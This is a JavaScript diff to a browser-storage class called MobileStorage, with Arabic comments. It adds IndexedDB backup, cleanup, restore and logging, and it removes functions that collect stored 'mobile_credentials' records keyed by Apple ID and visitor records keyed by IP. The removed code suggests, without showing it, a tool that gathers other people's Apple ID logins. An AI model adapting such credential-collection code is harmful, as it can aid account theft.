+            // الاحتفاظ بـ 10 نسخ فقط
+            await this.cleanupOldBackups();
             
-            console.log('💾 تم إنشاء نسخة احتياطية للهاتف');
+            console.log('💾 Backup created:', backupData.id);
+            
+            return backupData.id;
             
         } catch (error) {
-            console.warn('⚠️ لا يمكن إنشاء نسخة احتياطية:', error);
+            console.warn('⚠️ Backup error:', error);
+            return null;
         }
     }
     
-    // الحصول من IndexedDB
-    async getFromIndexedDB(storeName, limit = 100) {
+    // حفظ النسخة الاحتياطية في IndexedDB
+    async saveBackupToIndexedDB(backupData) {
         return new Promise((resolve) => {
             try {
-                const transaction = this.db.transaction([storeName], 'readonly');
-                const store = transaction.objectStore(storeName);
-                const index = store.index('timestamp');
-                const request = index.openCursor(null, 'prev');
+                const transaction = this.storages.indexedDB.database.transaction(['backups'], 'readwrite');
+                const store = transaction.objectStore('backups');
                 
-                const results = [];
-                request.onsuccess = function(event) {
-                    const cursor = event.target.result;
-                    if (cursor && results.length < limit) {
-                        results.push(cursor.value);
-                        cursor.continue();
-                    } else {
-                        resolve(results);
-                    }
+                const request = store.put(backupData);
+                
+                request.onsuccess = () => {
+                    resolve(true);
                 };
                 
-                request.onerror = function() {
-                    resolve([]);
+                request.onerror = (event) => {
+                    console.warn('⚠️ Backup save error:', event.target.error);
+                    resolve(false);
                 };
                 
             } catch (error) {
-                console.warn('⚠️ لا يمكن القراءة من IndexedDB:', error);
-                resolve([]);
+                console.warn('⚠️ Backup error:', error);
+                resolve(false);
             }
         });
     }
     
-    // الحصول على جميع بيانات الدخول
-    async getAllCredentials() {
+    // تنظيف النسخ الاحتياطية القديمة
+    async cleanupOldBackups() {
+        if (!this.storages.indexedDB?.available) return;
+        
+        return new Promise((resolve) => {
+            try {
+                const transaction = this.storages.indexedDB.database.transaction(['backups'], 'readwrite');
+                const store = transaction.objectStore('backups');
+                const index = store.index('id');
+                
+                const request = index.getAll();
+                
+                request.onsuccess = async (event) => {
+                    const backups = event.target.result || [];
+                    
+                    // ترتيب حسب الوقت
+                    backups.sort((a, b) => new Date(a.timestamp) - new Date(b.timestamp));
+                    
+                    // الاحتفاظ بـ 10 نسخ فقط
+                    if (backups.length > 10) {
+                        const toDelete = backups.slice(0, backups.length - 10);
+                        
+                        for (const backup of toDelete) {
+                            store.delete(backup.id);
+                        }
+                        
+                        console.log(`🗑️ Cleaned ${toDelete.length} old backups`);
+                    }
+                    
+                    resolve(true);
+                };
+                
+                request.onerror = (event) => {
+                    console.warn('⚠️ Backup cleanup error:', event.target.error);
+                    resolve(false);
+                };
+                
+            } catch (error) {
+                console.warn('⚠️ Backup cleanup error:', error);
+                resolve(false);
+            }
+        });
+    }
+    
+    // تنظيف البيانات القديمة
+    async cleanupOldData() {
+        const now = Date.now();
+        const maxAge = 30 * 24 * 60 * 60 * 1000; // 30 يوم
+        
         try {
-            const sources = [];
-            
-            // من IndexedDB
-            if (this.db) {
-                const dbCreds = await this.getFromIndexedDB('credentials', 500);
-                sources.push(...dbCreds);
+            // تنظيف localStorage
+            let cleanedLocal = 0;
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                const item = localStorage.getItem(key);
+                
+                if (item) {
+                    try {
+                        const data = JSON.parse(item);
+                        if (now - data.timestamp > maxAge) {
+                            localStorage.removeItem(key);
+                            cleanedLocal++;
+                        }
+                    } catch (e) {
+                        // تجاهل العناصر غير الصالحة
+                    }
+                }
             }
             
-            // من localStorage
-            const localCreds = JSON.parse(localStorage.getItem('mobile_credentials') || '[]');
-            sources.push(...localCreds);
+            if (cleanedLocal > 0) {
+                console.log(`🧹 Cleaned ${cleanedLocal} old items from localStorage`);
+            }
             
-            // إزالة التكرارات
-            const unique = Array.from(new Map(sources.map(item => 
-                [item.timestamp + item.appleId, item]
-            )).values());
-            
-            // فرز حسب التاريخ
-            return unique.sort((a, b) => 
-                new Date(b.timestamp) - new Date(a.timestamp)
-            );
+            // تحديث الاستخدام
+            this.storages.localStorage.used = this.getLocalStorageUsage();
             
         } catch (error) {
-            console.error('❌ خطأ في الحصول على البيانات:', error);
-            return [];
+            console.warn('⚠️ Data cleanup error:', error);
         }
     }
     
-    // الحصول على جميع الزيارات
-    async getAllVisits() {
+    // مراقبة حالة التخزين
+    monitorStorage() {
+        // مراقبة تغييرات localStorage
+        window.addEventListener('storage', (event) => {
+            this.logStorageEvent('storage', {
+                key: event.key,
+                oldValue: event.oldValue,
+                newValue: event.newValue,
+                url: event.url,
+                storageArea: event.storageArea
+            });
+        });
+        
+        // مراقبة إشارات تخزين منخفض
+        window.addEventListener('storage', (event) => {
+            if (event.key === 'storage_low' && event.newValue === 'true') {
+                console.warn('⚠️ Storage running low');
+                this.cleanupLocalStorage();
+            }
+        });
+    }
+    
+    // تسجيل عملية التخزين
+    async logStorageOperation(operation, data) {
         try {
-            const sources = [];
+            const log = {
+                id: `log_${Date.now()}`,
+                operation: operation,
+                timestamp: new Date().toISOString(),
+                ...data,
+                metadata: {
+                    userAgent: navigator.userAgent,
+                    url: window.location.href,
+                    storageStatus: this.getStorageStatus()
+                }
+            };
             
-            // من IndexedDB
-            if (this.db) {
-                const dbVisits = await this.getFromIndexedDB('mobile_visits', 1000);
-                sources.push(...dbVisits);
+            // حفظ في IndexedDB
+            if (this.storages.indexedDB?.available) {
+                await this.saveLogToIndexedDB(log);
             }
             
-            // من localStorage
-            const localVisits = JSON.parse(localStorage.getItem('mobile_visits') || '[]');
-            sources.push(...localVisits);
-            
-            // إزالة التكرارات
-            const unique = Array.from(new Map(sources.map(item => 
-                [item.timestamp + item.ip, item]
-            )).values());
-            
-            // فرز حسب التاريخ
-            return unique.sort((a, b) => 
-                new Date(b.timestamp) - new Date(a.timestamp)
-            );
-            
         } catch (error) {
-            console.error('❌ خطأ في الحصول على الزيارات:', error);
-            return [];
+            console.warn('⚠️ Log error:', error);
         }
+    }
+    
+    // تسجيل حدث التخزين
+    async logStorageEvent(type, data) {
+        await this.logStorageOperation(type, data);
+    }
+    
+    // حفظ السجل في IndexedDB
+    async saveLogToIndexedDB(log) {
+        return new Promise((resolve) => {
+            try {
+                const transaction = this.storages.indexedDB.database.transaction(['logs'], 'readwrite');
+                const store = transaction.objectStore('logs');
+                
+                const request = store.put(log);
+                
+                request.onsuccess = () => {
+                    resolve(true);
+                };
+                
+                request.onerror = (event) => {
+                    console.warn('⚠️ Log save error:', event.target.error);
+                    resolve(false);
+                };
+                
+            } catch (error) {
+                console.warn('⚠️ Log error:', error);
+                resolve(false);
+            }
+        });
+    }
+    
+    // الحصول على معلومات الجهاز
+    getDeviceInfo() {
+        const ua = navigator.userAgent;
+        const isMobile = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
+        
+        return {
+            isMobile: isMobile,
+            userAgent: ua,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: `${screen.width}x${screen.height}`,
+            cookies: navigator.cookieEnabled,
+            online: navigator.onLine
+        };
+    }
+    
+    // الحصول على حالة التخزين
+    getStorageStatus() {
+        const status = {
+            localStorage: {
+                available: this.storages.localStorage?.available || false,
+                used: this.storages.localStorage?.used || 0,
+                quota: this.storages.localStorage?.quota || 0,
+                percentage: this.storages.localStorage?.quota ? 
+                    (this.storages.localStorage.used / this.storages.localStorage.quota) * 100 : 0
+            },
+            sessionStorage: {
+                available: this.storages.sessionStorage?.available || false,
+                used: this.storages.sessionStorage?.used || 0
+            },
+            indexedDB: {
+                available: this.storages.indexedDB?.available || false
+            },
+            totalUsed: this.storages.localStorage?.used || 0
+        };
+        
+        return status;
+    }
+    
+    // الحصول على تقرير النظام
+    getSystemReport() {
+        return {
+            version: this.version,
+            supported: this.supported,
+            settings: this.settings,
+            storages: this.getStorageStatus(),
+            device: this.getDeviceInfo(),
+            timestamp: new Date().toISOString()
+        };
+    }
+    
+    // استعادة النسخة الاحتياطية
+    async restoreBackup(backupId) {
+        if (!this.storages.indexedDB?.available) {
+            throw new Error('IndexedDB not available');
+        }
+        
+        return new Promise((resolve, reject) => {
+            try {
+                const transaction = this.storages.indexedDB.database.transaction(['backups'], 'readonly');
+                const store = transaction.objectStore('backups');
+                
+                const request = store.get(backupId);
+                
+                request.onsuccess = async (event) => {
+                    const backup = event.target.result;
+                    
+                    if (!backup) {
+                        reject(new Error('Backup not found'));
+                        return;
+                    }
+                    
+                    // استعادة بيانات localStorage
+                    if (backup.data.localStorage) {
+                        for (const [key, value] of Object.entries(backup.data.localStorage)) {
+                            localStorage.setItem(key, value);
+                        }
+                    }
+                    
+                    console.log('🔄 Backup restored:', backupId);
+                    resolve(backup);
+                };
+                
+                request.onerror = (event) => {
+                    reject(event.target.error);
+                };
+                
+            } catch (error) {
+                reject(error);
+            }
+        });
     }
 }
 
-// إنشاء وتصدير نظام تخزين الهواتف
+// تصدير النظام للاستخدام العالمي
 window.MobileStorage = MobileStorage;
 
-// إنشاء نسخة عالمية
-if (!window.mobileStorage) {
-    window.mobileStorage = new MobileStorage();
+// تهيئة النظام تلقائياً
+if (typeof window !== 'undefined') {
+    window.addEventListener('DOMContentLoaded', async () => {
+        if (!window.mobileStorage) {
+            window.mobileStorage = new MobileStorage();
+            console.log('📱 Mobile Storage loaded globally as window.mobileStorage');
+        }
+    });
 }
 
-console.log('🚀 نظام تخزين الهواتف جاهز للاستخدام!');
+export default MobileStorage;
